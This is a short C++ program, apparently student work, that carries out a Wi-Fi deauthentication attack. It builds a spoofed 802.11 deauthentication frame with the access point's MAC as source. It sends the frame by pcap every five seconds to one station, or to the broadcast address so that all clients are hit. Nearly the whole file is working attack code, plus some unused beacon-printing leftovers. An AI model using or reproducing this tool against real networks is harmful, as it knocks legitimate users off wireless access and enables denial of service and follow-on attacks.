#include <bits/stdc++.h>
#include <unistd.h>
#include <pcap.h>
#include "beacon.h"
using namespace std;

map<Mac,PrintData>data;

bool isprint(const string&str){
	for(char k:str){
		if(!isprint(k)){
			return false;
		}
	}
	return true;
}
ostream& operator<<(ostream& os,const Mac&mac){
	return os<<string(mac);
}

ostream& operator<<(ostream& os,const map<Mac,PrintData>&data){
	os<<setfill('-')<<setw(80)<<"-"<<'\n';
	os<<setfill(' ')<<left<<setw(20)<<"BSSID"<<setw(10)<<"BEACONS"<<setw(40)<<"ESSID"<<'\n';
	for(auto k:data){
		os<<setw(20)<<left<<k.first<<setw(10)<<left<<k.second.beacons<<setw(40)<<left<<k.second.essid<<'\n';
	}
	os<<setfill('-')<<setw(80)<<"-"<<'\n';
	return os;
}

void usage() {
	puts("syntax : deauth-attack <interface> <ap mac> [<station mac>]");
	puts("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB");
}

int main(int argc, char* argv[]){
	if(argc!=3&&argc!=4){
		usage();
		exit(-1);
	}
	char *dev = argv[1];
	Mac ap=Mac(argv[2]),station=argc==4?Mac(argv[3]):Mac("FF:FF:FF:FF:FF:FF");
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 100, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	DF pkt;
	pkt.radiotap.it_version=0;
	pkt.radiotap.it_pad=0;
	pkt.radiotap.it_len=sizeof(Radiotap);
	pkt.radiotap.it_present=0x00028000;

	pkt.deauth.version=0;
	pkt.deauth.type=0;
	pkt.deauth.subtype=0xc;
	pkt.deauth.tods=0;
	pkt.deauth.fromds=0;
	pkt.deauth.morefrag=0;
	pkt.deauth.retry=0;
	pkt.deauth.powermgmt=0;
	pkt.deauth.moredata=0;
	pkt.deauth.wep=0;
	pkt.deauth.order=0;
	pkt.deauth.duration=314;
	pkt.deauth.da=station;
	pkt.deauth.sa=ap;
	pkt.deauth.bssid=ap;
	pkt.deauth.sequence_control=0;

	pkt.reason=7;
	while(true){
		if(pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&pkt),sizeof(DF))!=0){
			return 0;
		}
		sleep(5);
	}
	pcap_close(handle);
	return 0;
}